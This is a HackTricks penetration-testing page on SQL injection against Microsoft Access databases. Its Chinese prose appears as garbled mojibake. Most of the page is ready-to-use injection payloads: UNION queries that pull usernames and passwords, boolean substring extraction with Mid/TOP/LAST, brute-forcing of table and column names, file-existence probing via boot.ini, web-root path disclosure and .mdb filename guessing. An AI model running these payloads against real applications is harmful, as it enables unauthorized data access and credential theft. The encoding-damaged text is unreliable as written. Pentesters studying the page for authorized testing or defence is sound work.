# MS Access SQL æ³¨å…¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åœ¨çº¿å®éªŒåœº

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## æ•°æ®åº“é™åˆ¶

### å­—ç¬¦ä¸²è¿æ¥

å­—ç¬¦ä¸²è¿æ¥å¯ä»¥ä½¿ç”¨ `& (%26)` å’Œ `+ (%2b)` å­—ç¬¦ã€‚
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### è¯„è®º

MS Accessä¸­æ²¡æœ‰æ³¨é‡Šï¼Œä½†æ˜¾ç„¶å¯ä»¥ä½¿ç”¨ä¸€ä¸ªNULLå­—ç¬¦æ¥ç§»é™¤æŸ¥è¯¢çš„æœ€åéƒ¨åˆ†ï¼š
```sql
1' union select 1,2 from table%00
```
å¦‚æœè¿™ä¸èµ·ä½œç”¨ï¼Œæ‚¨å¯ä»¥éšæ—¶ä¿®æ­£æŸ¥è¯¢çš„è¯­æ³•ï¼š
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### å †å æŸ¥è¯¢

ä¸æ”¯æŒã€‚

### LIMIT

**`LIMIT`** æ“ä½œç¬¦**æœªå®ç°**ã€‚ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨ `TOP` æ“ä½œç¬¦å°† SELECT æŸ¥è¯¢ç»“æœé™åˆ¶ä¸º**å‰ N è¡Œè¡¨æ•°æ®**ã€‚`TOP` æ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºè¦è¿”å›çš„è¡Œæ•°ã€‚
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
å°±åƒ **`TOP`** ä¸€æ ·ï¼Œä½ å¯ä»¥ä½¿ç”¨ **`LAST`** æ¥è·å–**ä»æœ«å°¾å¼€å§‹çš„è¡Œ**ã€‚

## UNION æŸ¥è¯¢/å­æŸ¥è¯¢

åœ¨ SQLi ä¸­ï¼Œä½ é€šå¸¸ä¼šæƒ³è¦ä»¥æŸç§æ–¹å¼æ‰§è¡Œæ–°çš„æŸ¥è¯¢ï¼Œä»¥ä»å…¶ä»–è¡¨ä¸­æå–ä¿¡æ¯ã€‚MS Access æ€»æ˜¯è¦æ±‚åœ¨**å­æŸ¥è¯¢æˆ–é¢å¤–æŸ¥è¯¢ä¸­æŒ‡æ˜ `FROM`**ã€‚\
å› æ­¤ï¼Œå¦‚æœä½ æƒ³æ‰§è¡Œ `UNION SELECT`ã€`UNION ALL SELECT` æˆ–åœ¨æ¡ä»¶ä¸­å¸¦æ‹¬å·çš„ `SELECT`ï¼Œä½ æ€»æ˜¯**éœ€è¦æŒ‡æ˜ä¸€ä¸ªå¸¦æœ‰æœ‰æ•ˆè¡¨åçš„ `FROM`**ã€‚\
å› æ­¤ï¼Œä½ éœ€è¦çŸ¥é“ä¸€ä¸ª**æœ‰æ•ˆçš„è¡¨å**ã€‚
```sql
-1' UNION SELECT username,password from users%00
```
### é“¾æ¥ç­‰äº + å­å­—ç¬¦ä¸²

{% hint style="warning" %}
è¿™å°†å…è®¸ä½ åœ¨ä¸éœ€è¦çŸ¥é“è¡¨åçš„æƒ…å†µä¸‹æå–å½“å‰è¡¨çš„å€¼ã€‚
{% endhint %}

**MS Access** å…è®¸ä½¿ç”¨ **`'1'=2='3'='asd'=false`** è¿™æ ·çš„**å¥‡æ€ªè¯­æ³•**ã€‚é€šå¸¸ SQL æ³¨å…¥ä¼šåœ¨ **`WHERE`** å­å¥ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚

å‡è®¾ä½ åœ¨ MS Access æ•°æ®åº“ä¸­å‘ç°äº†ä¸€ä¸ª SQLiï¼Œå¹¶ä¸”ä½ çŸ¥é“ï¼ˆæˆ–çŒœæµ‹ï¼‰ä¸€ä¸ª**åˆ—åæ˜¯ username**ï¼Œè¿™å°±æ˜¯ä½ æƒ³è¦**æå–**çš„å­—æ®µã€‚ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨é“¾æ¥ç­‰äºæŠ€æœ¯æ£€æŸ¥ web åº”ç”¨ç¨‹åºçš„ä¸åŒå“åº”ï¼Œå¹¶ä¸”å¯èƒ½ä½¿ç”¨ **`Mid`** å‡½æ•°é€šè¿‡**å¸ƒå°”æ³¨å…¥**æ¥æå–å†…å®¹ï¼Œä»¥è·å–å­å­—ç¬¦ä¸²ã€‚
```sql
'=(Mid(username,1,3)='adm')='
```
å¦‚æœæ‚¨çŸ¥é“è¦è½¬å‚¨çš„**è¡¨å**å’Œ**åˆ—å**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ `Mid`ã€`LAST` å’Œ `TOP` çš„ç»„åˆé€šè¿‡å¸ƒå°” SQLi **æ³„éœ²æ‰€æœ‰ä¿¡æ¯**ï¼š
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### ç©·ä¸¾è¡¨å

ä½¿ç”¨é“¾å¼ç­‰äºæŠ€æœ¯ï¼Œä½ ä¹Ÿå¯ä»¥**ç©·ä¸¾è¡¨å**ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨æ›´ä¼ ç»Ÿçš„æ–¹æ³•ï¼š
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
è¯·éšæ„åœ¨åœ¨çº¿ç¯å¢ƒä¸­æ£€æŸ¥ã€‚

* Sqlmap å¸¸è§è¡¨åï¼š[https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* è¿˜æœ‰å¦ä¸€ä¸ªåˆ—è¡¨åœ¨ [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### æš´åŠ›ç ´è§£åˆ—å

æ‚¨å¯ä»¥ä½¿ç”¨é“¾å¼ç­‰å·æŠ€å·§æ¥**æš´åŠ›ç ´è§£å½“å‰åˆ—å**ï¼š
```sql
'=column_name='
```
æˆ–ä½¿ç”¨**group by**ï¼š
```sql
-1' GROUP BY column_name%00
```
æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æš´åŠ›ç ´è§£**ä¸åŒè¡¨**çš„åˆ—åï¼š
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### å¯¼å‡ºæ•°æ®

æˆ‘ä»¬å·²ç»è®¨è®ºäº†[**é“¾å¼ç­‰äºæŠ€æœ¯**](ms-access-sql-injection.md#chaining-equals-+-substring) **ç”¨äºä»å½“å‰å’Œå…¶ä»–è¡¨ä¸­å¯¼å‡ºæ•°æ®**ã€‚ä½†è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼š
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
### åŸºäºæ—¶é—´

æŸ¥çœ‹ [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### å…¶ä»–æœ‰è¶£çš„å‡½æ•°

* `Mid('admin',1,1)` ä»ä½ç½®1å¼€å§‹è·å–é•¿åº¦ä¸º1çš„å­å­—ç¬¦ä¸²ï¼ˆåˆå§‹ä½ç½®ä¸º1ï¼‰
* `LEN('1234')` è·å–å­—ç¬¦ä¸²é•¿åº¦
* `ASC('A')` è·å–å­—ç¬¦çš„asciiå€¼
* `CHR(65)` ä»asciiå€¼è·å–å­—ç¬¦ä¸²
* `IIF(1=1,'a','b')` å¦‚æœç„¶å
* `COUNT(*)` è®¡æ•°é¡¹ç›®æ•°é‡

## æšä¸¾è¡¨æ ¼

ä» [**è¿™é‡Œ**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) ä½ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæŸ¥è¯¢æ•°æ®åº“ä¸­è¡¨æ ¼åç§°çš„æŸ¥è¯¢ï¼š
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
```markdown
ä½†è¯·æ³¨æ„ï¼Œé€šå¸¸ä¼šé‡åˆ°**æ— æ³•è®¿é—®`MSysObjects`è¡¨**çš„SQLæ³¨å…¥æƒ…å†µã€‚

## æ–‡ä»¶ç³»ç»Ÿè®¿é—®

### Webæ ¹ç›®å½•å®Œæ•´è·¯å¾„

äº†è§£**webæ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„å¯èƒ½æœ‰åŠ©äºè¿›ä¸€æ­¥çš„æ”»å‡»**ã€‚å¦‚æœåº”ç”¨ç¨‹åºé”™è¯¯æ²¡æœ‰å®Œå…¨éšè—ï¼Œå¯ä»¥é€šè¿‡å°è¯•ä»ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®åº“ä¸­é€‰æ‹©æ•°æ®æ¥å‘ç°ç›®å½•è·¯å¾„ã€‚

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Accessä¼šå“åº”ä¸€ä¸ª**åŒ…å«webç›®å½•å®Œæ•´è·¯å¾„çš„é”™è¯¯ä¿¡æ¯**ã€‚

### æ–‡ä»¶æšä¸¾

ä»¥ä¸‹æ”»å‡»å‘é‡å¯ç”¨äº**æ¨æ–­è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿä¸Šæ–‡ä»¶çš„å­˜åœ¨**ã€‚å¦‚æœæŒ‡å®šçš„æ–‡ä»¶å­˜åœ¨ï¼ŒMS Accessä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œå‘ŠçŸ¥æ•°æ®åº“æ ¼å¼æ— æ•ˆï¼š

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

å¦ä¸€ç§æšä¸¾æ–‡ä»¶çš„æ–¹æ³•æ˜¯**æŒ‡å®šä¸€ä¸ªdatabase.tableé¡¹**ã€‚**å¦‚æœ**æŒ‡å®šçš„**æ–‡ä»¶å­˜åœ¨**ï¼ŒMS Accessä¼šæ˜¾ç¤ºä¸€ä¸ª**æ•°æ®åº“æ ¼å¼é”™è¯¯ä¿¡æ¯**ã€‚

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdbæ–‡ä»¶åçŒœæµ‹

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢æ¥æ¨æ–­**æ•°æ®åº“æ–‡ä»¶å(.mdb)**ï¼š

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

å…¶ä¸­**name\[i]æ˜¯.mdbæ–‡ä»¶å**ï¼Œè€Œ**realTableæ˜¯æ•°æ®åº“ä¸­å­˜åœ¨çš„è¡¨**ã€‚å°½ç®¡MS Accessæ€»æ˜¯ä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼Œä½†å¯ä»¥åŒºåˆ†æ— æ•ˆçš„æ–‡ä»¶åå’Œæœ‰æ•ˆçš„.mdbæ–‡ä»¶åã€‚

### .mdbå¯†ç ç ´è§£å™¨

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html)æ˜¯ä¸€ä¸ªå…è´¹å·¥å…·ï¼Œå¯ç”¨äºæ¢å¤Microsoft Access 95/97/2000/XPæˆ–Jetæ•°æ®åº“å¼•æ“3.0/4.0çš„ä¸»æ•°æ®åº“å¯†ç ã€‚

## å‚è€ƒèµ„æ–™

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
```
